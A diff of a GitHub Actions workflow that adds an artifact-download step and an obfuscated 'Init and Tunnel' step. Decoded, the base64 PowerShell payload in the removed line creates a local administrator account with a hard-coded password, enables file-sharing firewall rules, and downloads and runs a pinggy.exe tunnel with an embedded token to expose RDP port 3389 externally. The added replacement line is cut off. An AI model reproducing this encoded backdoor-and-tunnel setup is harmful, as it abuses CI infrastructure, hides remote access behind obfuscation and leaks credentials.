@@ -9,6 +9,32 @@ jobs:
     timeout-minutes: 360   # Max runtime 6 hours
 
     steps:
+      - name: Setup latest .NET SDK
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 'latest'
+
+      - name: Check if "data" artifact exists and download to Administrator Desktop
+        shell: pwsh
+        run: |
+          $errorActionPreference = 'SilentlyContinue'
+          $artifactName = "data"
+          $desktopPath = "C:\Users\Administrator\Desktop\data"
+
+          # Create destination folder if it doesn't exist
+          if (-not (Test-Path $desktopPath)) {
+              New-Item -ItemType Directory -Path $desktopPath | Out-Null
+          }
+
+          # Download artifact (if it exists)
+          try {
+            Write-Host "Attempting to download artifact '$artifactName'..."
+            # This will not fail the workflow if the artifact does not exist
+            & "${env:GITHUB_WORKSPACE}\..\actions\download-artifact\dist\download-artifact.js" --name $artifactName --path $desktopPath
+          } catch {
+            Write-Host "Artifact '$artifactName' not found. Skipping download."
+          }
+
       - name: Init and Tunnel
         run: |
-          powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwAQwB1AHMAdABvAG0ATgBvAGQAZQAiACAALQBOAGEAbQBlACAAIgBBAGwAbABvAHcAQwBvAG4AbgAiACAALQBWAGEAbAB1AGUAIAAwAAoARQBuAGEAYgBsAGUALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBHAHIAbwB1AHAAIAAiAEYAaQBsAGUAIABhAG4AZAAgAFAAcgBpAG4AdABlAHIAIABTAGgAYQByAGkAbgBnACIACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABDAHUAcwB0AG8AbQBOAG8AZABlAFwAQQBjAGMAZQBzAHMAIgAgAC0ATgBhAG0AZQAgACIAQQB1AHQAaABNAG8AZABlACIAIAAtAFYAYQBsAHUAZQAgADEACgAKACMAIABDAHIAZQBhAHQAZQAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABhAGMAYwBvAHUAbgB0ACAAdwBpAHQAaAAgAGcAaQB2AGUAbgAgAHAAYQBzAHMAdwBvAHIAZAAKAG4AZQB0ACAAdQBzAGUAcgAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABPAEwARABVAFMARQBSACMANgAgAC8AYQBkAGQACgBuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAALwBhAGQAZAAKAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGIAaQBuAGEAcgB5ACAAYQBuAGQAIABzAHQAYQByAHQAIAB0AHUAbgBuAGUAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBzADMALgBhAHAALQBzAG8AdQB0AGgALQAxAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAHAAdQBiAGwAaQBjAC4AcABpAG4AZwBnAHkALgBiAGkAbgBhAHIAaQBlAHMALwBjAGwAaQAvAHYAMAAuADIALgA1AC8AdwBpAG4AZABvAHcAcwAvAGEAbQBkADYANAAvAHAAaQBuAGcAZwB5AC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAcABpAG4AZwBnAHkALgBlAHgAZQAiAAoALgBcAHAAaQBuAGcAZwB5AC4AZQB4AGUAIAAtAC0AdABvAGsAZQBuACAASwA0AHIAZABOAEwAWgBUAFEAZQA5ACAALQAtAHQAeQBwAGUAIAB0AGMAcAAgAC0AbAAgADMAMwA4ADkA
+          powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB[...]
